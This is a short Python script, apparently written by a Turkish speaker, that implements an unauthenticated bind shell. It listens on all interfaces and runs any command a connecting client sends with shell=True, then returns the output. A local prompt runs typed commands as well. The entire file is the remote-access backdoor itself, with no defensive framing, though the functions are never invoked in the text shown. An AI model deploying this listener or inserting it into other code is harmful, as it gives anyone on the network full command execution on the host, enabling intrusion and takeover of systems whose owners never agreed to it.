#!/usr/bin/env python
import socket
import subprocess
import threading

def handle_client(client_socket):
    print("Client connected!")
    while True:
        try:
            command = client_socket.recv(1024).decode('utf-8')
            if not command:
                break

            output = subprocess.run(command, shell=True, capture_output=True)
            result = output.stdout + output.stderr
            client_socket.send(result)
        except Exception as e:
            client_socket.send(f"Hata: {str(e)}".encode('utf-8'))

    client_socket.close()

def start_listener(listener_port):
    host = '0.0.0.0'
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, listener_port))
    server.listen(5)
    print(f"Listening...  {host}:{listener_port}")

    def accept_connections():
        while True:
            client_socket, addr = server.accept()
            print(f"Connection Accepted:  {addr}")
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()

    def handle_terminal_input():
        while True:
            command = input("Enter a command (or to quit type 'exit'): ")
            if command.lower() == 'exit':
                server.close()
                break
            try:
                output = subprocess.run(command, shell=True, capture_output=True)
                result = output.stdout.decode('utf-8') + output.stderr.decode('utf-8')
                print(result)
            except Exception as e:
                print(f"Hata: {str(e)}")

    threading.Thread(target=accept_connections).start()
    handle_terminal_input()
